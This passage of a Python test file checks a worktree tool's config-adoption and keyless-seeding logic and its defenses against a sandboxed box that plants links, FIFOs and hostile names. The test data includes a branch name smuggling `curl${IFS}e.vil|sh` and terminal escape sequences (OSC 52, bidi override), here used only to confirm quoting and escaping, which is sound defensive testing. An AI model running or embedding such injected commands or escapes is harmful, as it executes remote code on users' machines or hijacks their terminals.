    assert all(argv[:3] == ["worktree", "add", "--no-checkout"] for argv in adds)


def test_add_skips_hook_when_unset(fake_main):
    assert worktree.add("feat") == 0
    assert not any(c[:1] == ["sh"] for c in fake_main["calls"])
    assert not any(c[:2] == ["podman", "run"] for c in fake_main["calls"])


def test_worktree_init_verb_refuses_an_unknown_worktree(fake_main, monkeypatch, capsys):
    _init_hook(monkeypatch, fake_main["main"])
    assert worktree.init_config("nope") == 1
    assert "no worktree at" in capsys.readouterr().err


# ── add: the new checkout's config is offered for adoption ──────────────────────────
#
# The host runs a checkout's ADOPTED config (configpin, ADR-0022), and a fresh worktree has
# nothing adopted — so before this, `fy worktree add` left the adoption to the first-run prompt at
# `fy box up`, and seeded the keyless posture from an adopted config that didn't exist yet.

TOML = '[project]\nname = "acme"\n\n[proxy]\npassthrough = ["trusted.example"]\n'
EDITED = '[project]\nname = "acme"\n\n[proxy]\npassthrough = ["trusted.example", "evil.example"]\n'
KEYLESS = (
    '[project]\nname = "acme"\n\n[claude]\nkeyless = "oauth"\n\n[codex]\nkeyless = "chatgpt"\n'
)


def _adopt_main(fake_main, text: str = TOML) -> None:
    """Main's foldyard.toml, adopted — the reviewed baseline a worktree is measured against."""
    from foldyard import configpin

    (fake_main["main"] / "foldyard.toml").write_text(text)
    configpin.adopt(config.resolve(worktree="", repo=fake_main["main"]))


def _wt_adopted(name: str = "feat") -> bool:
    from foldyard import configpin, devmode

    return configpin.inspect(devmode.worktree_config(name)).pinned_exists


def _no_prompt(monkeypatch) -> None:
    def refuse(_q: str = "") -> str:
        raise AssertionError("prompted")

    monkeypatch.setattr("builtins.input", refuse)


def _branch_declares(monkeypatch, text: str) -> None:
    """The new branch's foldyard.toml differs from main's — written as the init step runs, i.e.
    after git made the checkout and before the adoption looks at it."""

    def init(_main: Path, wt_dir: Path) -> int:
        (wt_dir / "foldyard.toml").write_text(text)
        return 0

    monkeypatch.setattr(worktree, "_init_in_yard", init)


def test_add_adopts_a_config_identical_to_mains_without_asking(fake_main, monkeypatch, capsys):
    """The common case: the branch declares exactly what main's adopted copy does, so adopting
    grants nothing new — no prompt, no terminal needed, and one line saying what happened."""
    _adopt_main(fake_main)
    _no_prompt(monkeypatch)

    assert worktree.add("feat") == 0

    assert _wt_adopted("feat")
    out = capsys.readouterr().out
    assert "adopted — identical to main's" in out
    assert "WORKTREE=feat fy box up" in out


def test_add_never_adopts_what_changed_after_it_was_compared(fake_main, monkeypatch):
    """Every box binds the whole worktrees root, so the new checkout is writable from a running
    box while `add` compares it with main. The bytes adopted must be the bytes compared: a write
    landing between the two is not adopted on main's say-so."""
    from foldyard import configpin

    _adopt_main(fake_main)
    real = configpin.main_baseline

    def compare_then_box_writes(drift):
        base = real(drift)
        (drift.cfg.repo_root / "foldyard.toml").write_text(EDITED)
        return base

    monkeypatch.setattr(configpin, "main_baseline", compare_then_box_writes)

    assert worktree.add("feat") == 0
    assert not _wt_adopted("feat")


def test_add_shows_a_differing_config_and_adopts_nothing_without_a_terminal(
    fake_main, monkeypatch, capsys
):
    _adopt_main(fake_main)
    _branch_declares(monkeypatch, EDITED)

    assert worktree.add("feat") == 0  # the worktree is made either way

    assert not _wt_adopted("feat")
    io = capsys.readouterr()
    assert "evil.example" in io.err  # the diff against main is shown
    assert "WORKTREE=feat fy config adopt" in io.out


def test_add_yes_never_adopts_a_differing_config(fake_main, monkeypatch):
    """`-y` answers the REGISTER question only: it is no licence to adopt a config nobody read."""
    _adopt_main(fake_main)
    _branch_declares(monkeypatch, EDITED)

    assert worktree.add("feat", assume_yes=True) == 0
    assert not _wt_adopted("feat")


def test_add_offers_a_differing_config_for_adoption_on_a_terminal(fake_main, monkeypatch, capsys):
    _adopt_main(fake_main)
    _branch_declares(monkeypatch, EDITED)
    monkeypatch.setattr(worktree, "_stdin_is_tty", lambda: True)
    asked: list[str] = []
    monkeypatch.setattr("builtins.input", lambda q="": asked.append(q) or "a")

    assert worktree.add("feat") == 0

    assert asked and _wt_adopted("feat")
    assert "against the config the host runs for main" in capsys.readouterr().err.lower()


def test_add_declining_the_adoption_keeps_the_worktree(fake_main, monkeypatch, capsys):
    _adopt_main(fake_main)
    _branch_declares(monkeypatch, EDITED)
    monkeypatch.setattr(worktree, "_stdin_is_tty", lambda: True)
    monkeypatch.setattr("builtins.input", lambda q="": "q")

    assert worktree.add("feat") == 0

    assert not _wt_adopted("feat")
    assert "feat" in worktree_registry.checkouts(fake_main["main"])
    assert "WORKTREE=feat fy config adopt" in capsys.readouterr().out


def test_add_seeds_keyless_posture_from_the_config_it_just_adopted(fake_main, monkeypatch):
    """The ordering bug: the seed reads the worktree's ADOPTED config, which a fresh worktree had
    none of — so it was always a no-op, and the box came up with claude/codex off while main ran
    both on. Seeding after the adoption sees `[claude]`/`[codex] keyless`."""
    from foldyard import devmode

    _adopt_main(fake_main, KEYLESS)
    monkeypatch.setattr(
        devmode, "read", lambda apply_expiry=True: {"mode": {"claude": "on", "codex": "on"}}
    )
    seeded: list[tuple] = []
    monkeypatch.setattr(
        devmode, "set_mode", lambda updates, **kw: seeded.append((updates, kw)) or {}
    )

    assert worktree.add("feat") == 0
    assert seeded == [({"claude": "on", "codex": "on"}, {"reconcile": False})]


# ── a re-used name never inherits the old checkout's adoption ───────────────────────
#
# The pin is keyed by the checkout's PATH, so a worktree removed and re-added under the same name
# lands on the same key. Before this, `remove` left the pin behind and `add` took it for the new
# checkout's: no identical-to-main adoption, the seed read the old branch's config, and `--box`
# started a box the host reconciled from a branch that was gone.

EDITED_AGAIN = '[project]\nname = "acme"\n\n[proxy]\npassthrough = ["other.example"]\n'


def _git_removes_the_checkout(monkeypatch) -> None:
    """`git worktree remove` deletes the directory, as for real (the fixture's fake leaves it)."""
    git = worktree.subprocess.run

    def run(cmd, **kw):
        if cmd[:1] == ["git"] and "worktree" in cmd and "remove" in cmd:
            shutil.rmtree(cmd[-1])
            return _Proc(0)
        return git(cmd, **kw)

    monkeypatch.setattr(worktree.subprocess, "run", run)


def _old_branch_adopted(fake_main, monkeypatch, text: str = EDITED) -> None:
    """`feat` made, then its branch's config changed and adopted — then the worktree removed."""
    from foldyard import configpin, devmode

    assert worktree.add("feat") == 0
    (fake_main["wt_root"] / "feat" / "foldyard.toml").write_text(text)
    configpin.adopt(devmode.worktree_config("feat"))
    _git_removes_the_checkout(monkeypatch)
    assert worktree.remove("feat", assume_yes=True) == 0


def test_remove_drops_the_worktrees_adopted_config(fake_main, monkeypatch):
    from foldyard import configpin

    _adopt_main(fake_main)
    _old_branch_adopted(fake_main, monkeypatch)

    pin = worktree._pin_config(fake_main["main"], "feat")
    assert not configpin.pin_dir(pin).exists()


def test_re_adding_a_name_adopts_the_new_checkout_identical_to_main(fake_main, monkeypatch, capsys):
    from foldyard import configpin, devmode

    _adopt_main(fake_main)
    _old_branch_adopted(fake_main, monkeypatch)
    capsys.readouterr()

    assert worktree.add("feat") == 0

    assert "adopted — identical to main's" in capsys.readouterr().out
    drift = configpin.inspect(devmode.worktree_config("feat"))
    assert drift.pinned_exists and drift.pinned == drift.tree  # main's bytes, not the old branch's


def test_re_adding_a_name_with_a_differing_config_adopts_nothing_and_starts_no_box(
    fake_main, monkeypatch
):
    _adopt_main(fake_main)
    _old_branch_adopted(fake_main, monkeypatch)
    _branch_declares(monkeypatch, EDITED_AGAIN)
    runs = _box_runs(monkeypatch)

    assert worktree.add("feat", box_up=True) == 1

    assert not _wt_adopted("feat")
    assert not runs


def test_a_fresh_add_drops_a_pin_left_at_its_path_and_says_so(fake_main, monkeypatch, capsys):
    """However the old checkout went (deleted by hand, a remove from before this fix), a pin at the
    path of a checkout that doesn't exist yet can't be this one's."""
    from foldyard import configpin

    _adopt_main(fake_main)
    old = fake_main["wt_root"] / "feat"
    old.mkdir(parents=True)
    (old / "foldyard.toml").write_text(EDITED)
    configpin.adopt(worktree._pin_config(fake_main["main"], "feat"))
    shutil.rmtree(old)
    capsys.readouterr()

    assert worktree.add("feat") == 0

    out = capsys.readouterr().out
    assert "dropped" in out and "adopted — identical to main's" in out


def test_a_fresh_add_that_cannot_drop_a_left_pin_stops_before_git(fake_main, monkeypatch, capsys):
    """Going on would hand the new checkout the earlier one's adoption: a `✗`, no traceback, and
    no checkout made."""
    from foldyard import configpin

    def unreadable(_cfg):
        raise PermissionError("denied")

    monkeypatch.setattr(configpin, "forget", unreadable)

    assert worktree.add("feat") == 1

    assert "couldn't remove a config adoption" in capsys.readouterr().err
    assert not (fake_main["wt_root"] / "feat").exists()


def test_adopted_only_counts_a_pin_that_matches_the_tree(fake_main, monkeypatch):
    """A pin that differs from the tree, left unresolved (no terminal) or ignored, is not "ready":
    the host would reconcile from bytes this checkout doesn't hold."""
    from foldyard import configpin, devmode

    _adopt_main(fake_main)
    assert worktree.add("feat") == 0
    (fake_main["wt_root"] / "feat" / "foldyard.toml").write_text(EDITED)
    assert configpin.inspect(devmode.worktree_config("feat")).pinned_exists

    assert worktree._adopt_config("feat") is False


def test_the_pin_key_never_follows_a_link_the_box_planted(fake_main):
    """Every box writes the worktrees root: a `feat` swapped for a link to main must not make
    `remove feat` drop MAIN's adoption."""
    fake_main["wt_root"].mkdir(parents=True)
    (fake_main["wt_root"] / "feat").symlink_to(fake_main["main"])

    pin = worktree._pin_config(fake_main["main"], "feat")

    assert pin.repo_root == Path(os.path.realpath(fake_main["wt_root"])) / "feat"
    assert pin.worktree == "feat"


# ── the keyless seed happens at the worktree's FIRST adoption, wherever that is ─────────────
#
# A fresh worktree has no posture file, so claude/codex read `off` and its proxy injects nothing:
# the box's keyless dummy token 401s. The seed mirrors main's keyless axes in — at the first
# adoption, since only then can the worktree's adopted config say `keyless` at all, and that
# adoption may happen at `add`, at the launch gate, via `fy config adopt` or from the TUI.

KEYLESS_EDITED = KEYLESS + '\n[proxy]\npassthrough = ["evil.example"]\n'


def _main_runs(fake_main, monkeypatch, **mode: str) -> None:
    """Main adopted KEYLESS, with ``mode`` as its posture (written the way `fy mode` writes it).
    Real ``set_mode`` derives the proxy's per-worktree port, whose hash shells to ``cksum`` — which
    the fixture's git fake would answer with nothing — so the hash is pinned."""
    from foldyard import devmode

    monkeypatch.setattr(stack, "_hashed_offset", lambda name: 7)
    _adopt_main(fake_main, KEYLESS)
    if mode:
        with config.using(devmode.worktree_config("")):
            devmode.set_mode(mode, reconcile=False)


def _wt_mode_file(name: str = "feat") -> Path:
    from foldyard import devmode

    with config.using(devmode.worktree_config(name)):
        return config.mode_file()


def _wt_posture(name: str = "feat") -> dict | None:
    """The worktree's posture FILE as written (``None`` when there is none) — not ``read``'s
    defaults, which can't tell "never set" from "set to off"."""
    import json

    path = _wt_mode_file(name)
    return json.loads(path.read_text()) if path.exists() else None


def _unadopted_keyless_worktree(fake_main, monkeypatch, name: str = "feat") -> None:
    """A worktree whose config declares keyless but differs from main's, made with no terminal —
    so `add` adopts (and seeds) nothing, leaving the first adoption to a later door."""
    _branch_declares(monkeypatch, KEYLESS_EDITED)
    assert worktree.add(name) == 0
    assert not _wt_adopted(name)
    assert _wt_posture(name) is None


def _at_a_terminal(monkeypatch, answer: str = "a") -> None:
    import types

    monkeypatch.setattr("sys.stdin", types.SimpleNamespace(isatty=lambda: True))
    monkeypatch.setattr("builtins.input", lambda q="": answer)


def _gate(monkeypatch, name: str = "feat") -> str:
    """`WORKTREE=<name> fy box up`'s launch gate, without its re-exec."""
    from foldyard import configpin

    monkeypatch.setenv("WORKTREE", name)
    monkeypatch.setattr(configpin, "_rerun_with_adopted_config", lambda verb, rerun: None)
    return configpin.gate("box up")


def test_add_seeds_only_mains_keyless_axes_that_are_on(fake_main, monkeypatch, capsys):
    """Main's ACTUAL values: codex=off in main stays off here, so nothing escalates past main —
    and nothing reconciles (set_mode's reconcile=False: nothing of the worktree is up yet)."""
    _main_runs(fake_main, monkeypatch, claude="on")

    assert worktree.add("feat") == 0

    posture = _wt_posture()
    assert posture is not None and posture["claude"] == "on" and posture["codex"] == "off"
    assert "seeded keyless mode from main: claude=on" in capsys.readouterr().err


def test_add_seeds_once(fake_main, monkeypatch, capsys):
    """`add` adopts through the same door as everything else — one seed, one line."""
    from foldyard import devmode

    _main_runs(fake_main, monkeypatch, claude="on", codex="on")
    calls: list[dict] = []
    real = devmode.set_mode
    monkeypatch.setattr(devmode, "set_mode", lambda u, **kw: calls.append(u) or real(u, **kw))

    assert worktree.add("feat") == 0

    assert calls == [{"claude": "on", "codex": "on"}]
    assert capsys.readouterr().err.count("seeded keyless mode") == 1


def test_a_first_adoption_at_the_launch_gate_seeds(fake_main, monkeypatch, capsys):
    """Declined (or no terminal) at `add`, adopted at `fy box up`'s gate: the box it then starts
    must come up injectable, so the seed lands before the gate re-runs the verb."""
    _main_runs(fake_main, monkeypatch, claude="on", codex="on")
    _unadopted_keyless_worktree(fake_main, monkeypatch)
    _at_a_terminal(monkeypatch)

    assert _gate(monkeypatch) == "pinned"

    posture = _wt_posture()
    assert posture is not None and (posture["claude"], posture["codex"]) == ("on", "on")
    assert "seeded keyless mode from main: claude=on, codex=on" in capsys.readouterr().err


def test_a_first_adoption_via_fy_config_adopt_seeds(fake_main, monkeypatch):
    from foldyard import cli

    _main_runs(fake_main, monkeypatch, claude="on")
    _unadopted_keyless_worktree(fake_main, monkeypatch)
    monkeypatch.setenv("WORKTREE", "feat")

    cli.config_adopt()

    posture = _wt_posture()
    assert posture is not None and posture["claude"] == "on"


def test_a_later_adoption_never_seeds(fake_main, monkeypatch):
    """Only the FIRST adoption seeds: main turning claude on afterwards is not this worktree's
    choice, and adopting an unrelated config edit must not make it one."""
    from foldyard import cli, devmode

    _main_runs(fake_main, monkeypatch)  # main: both off — the first adoption seeds nothing
    _unadopted_keyless_worktree(fake_main, monkeypatch)
    monkeypatch.setenv("WORKTREE", "feat")
    cli.config_adopt()
    assert _wt_posture() is None

    with config.using(devmode.worktree_config("")):
        devmode.set_mode({"claude": "on"}, reconcile=False)
    (fake_main["wt_root"] / "feat" / "foldyard.toml").write_text(KEYLESS_EDITED + "# edited\n")
    cli.config_adopt()

    assert _wt_posture() is None


def test_a_first_adoption_never_overrides_a_posture_already_set(fake_main, monkeypatch):
    """A posture file that already says claude=off — a lost adoption re-made, say — is the
    operator's choice; only the axes it doesn't set are seeded."""
    import json

    _main_runs(fake_main, monkeypatch, claude="on", codex="on")
    _unadopted_keyless_worktree(fake_main, monkeypatch)
    path = _wt_mode_file()
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps({"claude": "off", "expires": {}}))
    _at_a_terminal(monkeypatch)

    assert _gate(monkeypatch) == "pinned"

    posture = _wt_posture()
    assert posture is not None and (posture["claude"], posture["codex"]) == ("off", "on")


def test_main_off_seeds_nothing(fake_main, monkeypatch):
    _main_runs(fake_main, monkeypatch)
    _unadopted_keyless_worktree(fake_main, monkeypatch)
    _at_a_terminal(monkeypatch)

    assert _gate(monkeypatch) == "pinned"
    assert _wt_posture() is None


def test_a_config_without_keyless_seeds_nothing(fake_main, monkeypatch, capsys):
    """No `[claude]`/`[codex] keyless` in the worktree's adopted config: nothing to inject, so no
    posture is written — even with main running claude. Nor TRIED: the seed stays silent, rather
    than reaching set_mode with a switch this config doesn't have and swallowing its refusal."""
    _main_runs(fake_main, monkeypatch, claude="on")
    _branch_declares(monkeypatch, TOML)
    assert worktree.add("feat") == 0  # differs from main's KEYLESS: not adopted here
    _at_a_terminal(monkeypatch)
    capsys.readouterr()

    assert _gate(monkeypatch) == "pinned"
    assert _wt_posture() is None
    assert "keyless mode" not in capsys.readouterr().err


def test_main_is_never_seeded(fake_main, monkeypatch):
    """The seed's source is main, so it never writes main's posture — even where main's posture
    file doesn't set the axis (``read`` reports main as on here to make that observable)."""
    from foldyard import devmode, keyless

    _adopt_main(fake_main, KEYLESS)
    monkeypatch.setattr(devmode, "read", lambda apply_expiry=True: {"mode": {"claude": "on"}})
    calls: list = []
    monkeypatch.setattr(devmode, "set_mode", lambda *a, **k: calls.append(a))

    assert keyless.seed_posture(devmode.worktree_config("")) == {}
    assert not calls


def test_a_removed_and_re_added_worktree_is_seeded_again(fake_main, monkeypatch):
    """`remove` drops the worktree's posture (and its adoption), so the re-added worktree is
    fresh again and its first adoption seeds like the first time."""
    _main_runs(fake_main, monkeypatch, claude="on")
    assert worktree.add("feat") == 0
    assert _wt_posture() is not None
    _git_removes_the_checkout(monkeypatch)
    assert worktree.remove("feat", assume_yes=True) == 0
    assert _wt_posture() is None

    assert worktree.add("feat") == 0

    posture = _wt_posture()
    assert posture is not None and posture["claude"] == "on"


# ── add --box ───────────────────────────────────────────────────────────────────────


def _box_runs(monkeypatch, rc: int = 0) -> list[dict]:
    """Record each `fy box up` add spawns (argv + env), on top of the fixture's git fake."""
    runs: list[dict] = []
    git = worktree.subprocess.run

    def run(cmd, **kw):
        if cmd[1:] == ["-P", "-m", "foldyard", "box", "up"]:
            runs.append({"cmd": cmd, "env": kw.get("env")})
            return _Proc(rc)
        return git(cmd, **kw)

    monkeypatch.setattr(worktree.subprocess, "run", run)
    return runs


def test_add_box_brings_the_new_worktrees_box_up_in_a_fresh_process(fake_main, monkeypatch):
    """A fresh `fy box up`, not box code in-process: this process bound its import-time constants
    and caches before the adoption, exactly what the gate's own re-run exists to shed."""
    from foldyard import configpin

    _adopt_main(fake_main)
    monkeypatch.setenv(configpin.RERUN_ENV, "1")
    runs = _box_runs(monkeypatch)

    assert worktree.add("feat", box_up=True) == 0

    assert len(runs) == 1
    assert runs[0]["cmd"] == [sys.executable, "-P", "-m", "foldyard", "box", "up"]
    env = runs[0]["env"]
    assert env["WORKTREE"] == "feat"
    assert configpin.RERUN_ENV not in env  # the child's gate keeps its own re-run


def test_add_box_passes_on_box_ups_failure(fake_main, monkeypatch):
    _adopt_main(fake_main)
    _box_runs(monkeypatch, rc=3)
    assert worktree.add("feat", box_up=True) == 3


def test_add_box_does_not_start_a_box_whose_config_is_not_adopted(fake_main, monkeypatch, capsys):
    _adopt_main(fake_main)
    _branch_declares(monkeypatch, EDITED)
    runs = _box_runs(monkeypatch)

    assert worktree.add("feat", box_up=True) == 1

    assert not runs
    assert "isn't adopted" in capsys.readouterr().err
    assert "feat" in worktree_registry.checkouts(fake_main["main"])  # the worktree stays


def test_add_box_on_an_already_registered_worktree_brings_it_up(fake_main, monkeypatch):
    """Re-running `fy worktree add <n> --box` is how a declined or skipped box gets started; its
    own gate asks for whatever is still unadopted."""
    _adopt_main(fake_main)
    assert worktree.add("feat") == 0
    runs = _box_runs(monkeypatch)

    assert worktree.add("feat", box_up=True) == 0
    assert len(runs) == 1 and runs[0]["env"]["WORKTREE"] == "feat"


def test_add_without_box_starts_nothing(fake_main, monkeypatch):
    _adopt_main(fake_main)
    runs = _box_runs(monkeypatch)
    assert worktree.add("feat") == 0
    assert not runs


def test_list_prints_main_and_worktrees(fake_main, capsys):
    (fake_main["wt_root"] / "alpha").mkdir(parents=True)
    (fake_main["wt_root"] / "alpha" / ".git").write_text("")  # worktree marker
    assert worktree.list_() == 0
    out = capsys.readouterr().out
    assert "main" in out and "alpha" in out


def test_list_marks_a_worktree_the_host_has_no_record_of(fake_main, capsys):
    assert worktree.add("feat") == 0
    _existing_git_worktree(fake_main, "old")
    capsys.readouterr()
    assert worktree.list_() == 0
    lines = capsys.readouterr().out.splitlines()
    assert "(not registered)" in next(line for line in lines if " old " in line)
    assert "(not registered)" not in next(line for line in lines if " feat " in line)
    assert any("fy worktree add <name>" in line for line in lines)


# ── a checkout your computer has no record of: nothing runs in it, and its names are inert ──
#
# The worktrees root is box-writable: a dir there is named by the box, and its `.git` file can name
# a git dir (and with it a config) the box built. So `list`, `add` on an existing one and `remove`
# read its branch from its HEAD in main's `.git/worktrees` instead of asking git in it, and every
# name is printed with its control characters shown as escapes.

UNPRINTABLE = "\x1b]52;c;aGk=\x07\x9b2J\N{RIGHT-TO-LEFT OVERRIDE}"  # OSC 52, a C1 CSI, a bidi flip
CONTROLS = {"\x1b", "\x07", "\x9b", "\N{RIGHT-TO-LEFT OVERRIDE}"}
# Git's ref-name rules ban C0 controls, not C1 or bidi ones: a branch can carry these.
IN_A_REF = "\x9b2J\N{RIGHT-TO-LEFT OVERRIDE}"


def _box_made_checkout(fake_main, name: str, head: str, *, gitdir: str | None = None) -> Path:
    """A checkout made by `git worktree add` in a box: its admin dir in main's `.git/worktrees`
    (with ``head`` as its HEAD), a `.git` file naming it (``gitdir``, else its absolute path), and
    git listing it."""
    admin = fake_main["main"] / ".git" / "worktrees" / name
    admin.mkdir(parents=True)
    (admin / "HEAD").write_text(head)
    wt = fake_main["wt_root"] / name
    wt.mkdir(parents=True)
    (wt / ".git").write_text(f"gitdir: {gitdir or admin}\n")
    fake_main["state"]["registered"].add(str(wt))
    return wt


def _git_ran_in(calls: list[list[str]], wt: Path) -> bool:
    return any(c[:1] == ["git"] and str(wt) in c[c.index("-C") + 1 : c.index("-C") + 2]
               for c in calls if "-C" in c)  # fmt: skip


def test_list_runs_no_git_in_a_checkout_it_has_no_record_of(fake_main, capsys):
    wt = _box_made_checkout(fake_main, "boxed", "ref: refs/heads/wt/boxed\n")
    assert worktree.list_() == 0
    assert not _git_ran_in(fake_main["calls"], wt)
    line = next(ln for ln in capsys.readouterr().out.splitlines() if " boxed " in ln)
    assert "wt/boxed" in line  # read from its HEAD in main's .git, not asked of git


def test_list_runs_no_git_in_a_registered_checkout_either(fake_main, capsys):
    # Its `.git` file is the box's to rewrite all the same: git run there reads whatever git dir
    # (and config) that names. Its HEAD in main's `.git/worktrees` says the branch.
    assert worktree.add("feat") == 0
    wt = fake_main["wt_root"] / "feat"
    (fake_main["main"] / ".git" / "worktrees" / "feat" / "HEAD").write_text(
        "ref: refs/heads/wt/feat\n"
    )
    capsys.readouterr()
    assert worktree.list_() == 0
    assert not _git_ran_in(fake_main["calls"], wt)
    line = next(ln for ln in capsys.readouterr().out.splitlines() if " feat " in ln)
    assert "wt/feat" in line


def test_list_reads_mains_branch_with_git_that_cannot_fetch(fake_main):
    # Main's `.git/config` is the box's too: the read goes through `_git_read`.
    assert worktree.list_() == 0
    asked = next(c for c in fake_main["calls"] if "--abbrev-ref" in c)
    assert "protocol.allow=never" in asked and asked[asked.index("-C") + 1] == str(
        fake_main["main"]
    )


def test_a_detached_head_reads_as_git_would_say_it(fake_main, capsys):
    _box_made_checkout(fake_main, "boxed", f"{BRANCH_OID}\n")
    assert worktree.list_() == 0
    line = next(ln for ln in capsys.readouterr().out.splitlines() if " boxed " in ln)
    assert " HEAD " in line  # `rev-parse --abbrev-ref HEAD` on a detached checkout


def test_a_git_dir_outside_mains_worktrees_is_not_read(fake_main, tmp_path, capsys):
    """The box writes the `.git` file: a git dir it built elsewhere names no branch."""
    planted = tmp_path / "planted"
    planted.mkdir()
    (planted / "HEAD").write_text("ref: refs/heads/planted\n")
    wt = fake_main["wt_root"] / "boxed"
    wt.mkdir(parents=True)
    (wt / ".git").write_text(f"gitdir: {planted}\n")
    assert worktree.list_() == 0
    assert "planted" not in capsys.readouterr().out
    assert not _git_ran_in(fake_main["calls"], wt)


def test_a_linked_admin_dir_is_not_followed(fake_main, tmp_path, capsys):
    planted = tmp_path / "planted"
    planted.mkdir()
    (planted / "HEAD").write_text("ref: refs/heads/planted\n")
    home = fake_main["main"] / ".git" / "worktrees"
    home.mkdir(parents=True)
    (home / "boxed").symlink_to(planted)
    wt = fake_main["wt_root"] / "boxed"
    wt.mkdir(parents=True)
    (wt / ".git").write_text(f"gitdir: {home / 'boxed'}\n")
    assert worktree.list_() == 0
    assert "planted" not in capsys.readouterr().out


def test_list_shows_a_box_chosen_name_and_branch_inert(fake_main, capsys):
    _box_made_checkout(fake_main, f"x{UNPRINTABLE}", f"ref: refs/heads/b{IN_A_REF}\n")
    assert worktree.list_() == 0
    out = capsys.readouterr().out
    assert not CONTROLS & set(out)
    assert "x\\x1b]52" in out and "b\\x9b2J" in out  # shown, as its escapes


def test_add_on_an_existing_checkout_runs_no_git_in_it(fake_main, monkeypatch, capsys):
    wt = _box_made_checkout(fake_main, "old", f"ref: refs/heads/wt/old{IN_A_REF}\n")
    monkeypatch.setattr("builtins.input", lambda *a: "y")
    assert worktree.add("old") == 0
    assert not _git_ran_in(fake_main["calls"], wt)
    out = capsys.readouterr().out
    assert "(branch wt/old\\x9b2J" in out and not CONTROLS & set(out)


def test_add_names_the_branch_it_forks_off_inert(fake_main, capsys):
    """`origin/HEAD` is in the shared `.git` the box writes: the default branch it names is shown
    with its control characters as escapes."""
    fake_main["state"]["origin_head"] = f"refs/remotes/origin/m{UNPRINTABLE}"
    assert worktree.add("feat") == 0
    out = capsys.readouterr().out
    assert "new branch off origin/m\\x1b]52" in out and not CONTROLS & set(out)


def test_remove_runs_no_git_in_a_checkout_it_has_no_record_of(fake_main, capsys):
    wt = _box_made_checkout(fake_main, "boxed", f"ref: refs/heads/wt/boxed{IN_A_REF}\n")
    assert worktree.remove("boxed", assume_yes=True) == 0
    assert not any(
        c[:1] == ["git"] and "rev-parse" in c and str(wt) in c for c in fake_main["calls"]
    )
    out = capsys.readouterr().out
    assert "branch 'wt/boxed\\x9b2J" in out and not CONTROLS & set(out)


@pytest.mark.parametrize(
    "ref",
    [
        f"wt/x{UNPRINTABLE}",  # a C0 control
        "wt/x y",
        "wt/a..b",
        "wt/x~1",
        "wt/x:y",
        "wt/x?",
        "wt/x*",
        "wt/x[y",
        "wt/x\\y",
        "wt/x@{1}",
        "-x",
        "wt/x.lock",
        "wt/x/",
        "wt/x.",
        "wt/" + "x" * 300,  # past any name a branch would have
    ],
)
def test_a_head_naming_no_ref_git_would_take_shows_no_branch(fake_main, capsys, ref):
    _box_made_checkout(fake_main, "boxed", f"ref: refs/heads/{ref}\n")
    assert worktree._branch_read(fake_main["main"], fake_main["wt_root"] / "boxed") == ""


def test_the_remove_hint_quotes_the_branch(fake_main, capsys):
    """A ref name git takes can still be a shell command once pasted: the hint quotes it."""
    _box_made_checkout(fake_main, "boxed", "ref: refs/heads/x;curl${IFS}e.vil|sh\n")
    assert worktree.remove("boxed", assume_yes=True) == 0
    assert "git branch -D 'x;curl${IFS}e.vil|sh'" in capsys.readouterr().out


def test_a_reftable_repos_placeholder_head_is_no_branch(fake_main, capsys):
    """A reftable repo (git 2.45+) keeps a worktree's HEAD in its ref store, and the admin dir's
    HEAD file is a placeholder: the branch is the one main's `git worktree list` names."""
    wt = _box_made_checkout(fake_main, "boxed", "ref: refs/heads/.invalid\n")
    assert worktree._branch_read(fake_main["main"], wt) == ""
    fake_main["state"]["listed_branch"][str(wt)] = "wt/boxed"
    assert worktree._branch_read(fake_main["main"], wt) == "wt/boxed"
    assert not _git_ran_in(fake_main["calls"], wt)
    assert worktree.list_() == 0
    assert ".invalid" not in capsys.readouterr().out


def test_in_a_box_a_branch_is_asked_of_its_own_git_plainly(fake_main, monkeypatch):
    # The box's git and `.git` are its own: nothing to keep from it, and `_git_read`'s probe (and,
    # on an old git, its config scan) would run through the box's slow index-split shim per card.
    monkeypatch.setattr(config, "in_box", lambda: True)
    assert worktree._branch_of(fake_main["main"]) == "main"
    asked = next(c for c in fake_main["calls"] if "--abbrev-ref" in c)
    assert asked == ["git", "-C", str(fake_main["main"]), "rev-parse", "--abbrev-ref", "HEAD"]


def test_list_asks_git_for_the_listing_once_however_many_worktrees_need_it(fake_main):
    # Each reftable worktree's branch comes from main's `git worktree list`: one listing a pass,
    # not one a worktree (the TUI asks every 5 s, and each may wait out its timeout).
    for name in ("a", "b", "c"):
        _box_made_checkout(fake_main, name, "ref: refs/heads/.invalid\n")
    fake_main["calls"].clear()
    assert worktree.list_() == 0
    assert sum(1 for c in fake_main["calls"] if c[-3:] == ["worktree", "list", "--porcelain"]) == 1


def test_a_relative_git_file_is_read(fake_main):
    """`worktree.useRelativePaths` (git 2.48+) writes the `.git` file relative to the checkout."""
    wt = _box_made_checkout(
        fake_main, "boxed", "ref: refs/heads/wt/boxed\n", gitdir="../../repo/.git/worktrees/boxed"
    )
    assert worktree._branch_read(fake_main["main"], wt) == "wt/boxed"


def test_a_relative_git_file_leading_out_of_mains_worktrees_is_not_read(fake_main, tmp_path):
    planted = tmp_path / "planted" / "boxed"
    planted.mkdir(parents=True)
    (planted / "HEAD").write_text("ref: refs/heads/planted\n")
    wt = fake_main["wt_root"] / "boxed"
    wt.mkdir(parents=True)
    (wt / ".git").write_text("gitdir: ../../planted/boxed\n")
    assert worktree._branch_read(fake_main["main"], wt) == ""


def _head_as(fake_main, make) -> Path:
    """A box-made checkout whose admin dir's HEAD is whatever ``make(path)`` puts there."""
    wt = _box_made_checkout(fake_main, "boxed", "")
    head = fake_main["main"] / ".git" / "worktrees" / "boxed" / "HEAD"
    head.unlink()
    make(head)
    return wt


def test_a_fifo_head_is_no_branch_and_does_not_hang(fake_main):
    """The box can make HEAD a FIFO: opening one for reading blocks until a writer comes."""
    import threading

    wt = _head_as(fake_main, os.mkfifo)
    got: list[str] = []
    reader = threading.Thread(
        target=lambda: got.append(worktree._branch_read(fake_main["main"], wt)), daemon=True
    )
    reader.start()
    reader.join(timeout=5)
    assert not reader.is_alive(), "blocked opening a FIFO"
    assert got == [""]


def test_a_linked_head_is_not_followed(fake_main, tmp_path):
    outside = tmp_path / "outside"
    outside.write_text("ref: refs/heads/planted\n")
    wt = _head_as(fake_main, lambda head: head.symlink_to(outside))
    assert worktree._branch_read(fake_main["main"], wt) == ""


def test_a_head_that_is_no_file_is_no_branch(fake_main):
    wt = _head_as(fake_main, lambda head: head.mkdir())
    assert worktree._branch_read(fake_main["main"], wt) == ""


def test_add_on_an_existing_checkout_in_a_reftable_repo_names_its_branch(
    fake_main, monkeypatch, capsys
):
